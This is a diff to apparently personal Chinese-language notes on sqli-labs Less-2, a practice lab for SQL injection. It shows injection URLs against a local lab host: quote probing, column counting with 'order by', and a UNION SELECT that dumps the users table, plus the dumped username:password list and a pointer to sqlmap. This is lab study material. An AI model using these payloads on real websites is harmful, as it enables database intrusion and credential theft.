@@ -6,6 +6,7 @@ url:http://10.0.2.15/sqli/Less-2/?id=1%27
 故推测sql：select username,password from 用户表 where id = 用户输入 limit 0,1;
 
 拆解：
+方法一：
 1.字段数
 url：http://10.0.2.15/sqli/Less-2/?id=1 order by 3 --
 返回正常，说明字段数至少为3
@@ -31,3 +32,5 @@ users中字段名为id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTI
 url：http://10.0.2.15/sqli/Less-2/?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 from users--+
 Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
 
+方法二（使用sqlmap）：
+过程同Less1
